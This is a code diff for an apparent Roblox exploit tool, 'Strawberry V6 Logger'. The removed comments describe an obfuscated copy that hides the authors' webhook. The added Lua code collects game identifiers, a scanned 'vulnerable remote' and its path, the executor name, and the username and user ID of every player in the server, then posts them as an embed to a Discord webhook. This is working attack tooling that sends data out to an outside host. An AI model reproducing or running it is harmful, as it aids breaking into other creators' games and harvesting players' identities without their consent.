@@ -1,23 +1,39 @@
--- // this is the the obfuscated file in this repo aka Hook.lua but unobfuscated without our webhook
--- // reason that one is obfuscated it because it contains our webhook. but heres the code, just replace the webhook with yours.
-
-function SendMessage(url, message)
-    local http = game:GetService("HttpService")
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    local data = {
-        ["content"] = message
-    }
-    local body = http:JSONEncode(data)
-    local response = request({
-        Url = url,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
+local playersList = ""
+for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
+	playersList = playersList .. string.format("`%s` (%d)\n", player.Name, player.UserId)
 end
+if #playersList == 0 then playersList = "None" end
 
-local hook = "https://discord.com/api/webhooks/123"
+local embed = {
+	["title"] = "🍓 Strawberry Logged A Game!",
+	["description"] = "Game Link: [https://www.roblox.com/games/" .. game.PlaceId .. "](https://www.roblox.com/games/"..game.PlaceId..")",
+	["color"] = 16711680,
+	["fields"] = {
+		{
+			["name"] = "Game Info",
+			["value"] = string.format("```\nName: %s\nPlaceId: %d\nJobId: %s\nCreatorId: %d\n```", game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, game.PlaceId, game.JobId, game.CreatorId),
+			["inline"] = false
+		},
+		{
+			["name"] = "Exploit Info",
+			["value"] = string.format("```\nFound Remote: %s\nPath: %s\nScan Time: %.2fs\nExecutor: %s\n```", vulnerableRemote.Name, vulnerableRemote:GetFullName(), tick() - scanStartTime, Config.ExecutorName),
+			["inline"] = false
+		},
+		{
+			["name"] = "Players ("..#game:GetService("Players"):GetPlayers().."/"..game:GetService("Players").MaxPlayers..")",
+			["value"] = playersList,
+			["inline"] = true
+		}
+	},
+	["footer"] = {
+		["text"] = "Strawberry V6 // BEASTMODE by C:\\Drive, Saji & Sane"
+	},
+	["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S.000Z")
+}
 
-SendMessage(hook, "https://roblox.com/games/"..game.PlaceId.."/")
+request({
+	Url = "", -- PUT UR WEBHOOK HERE?!?!?!!?
+	Method = "POST",
+	Headers = {["Content-Type"] = "application/json"},
+	Body = game:GetService("HttpService"):JSONEncode({["username"] = "Strawberry Logger", ["avatar_url"] = "https://i.imgur.com/qav7D0t.png", ["embeds"] = {embed}})
+})
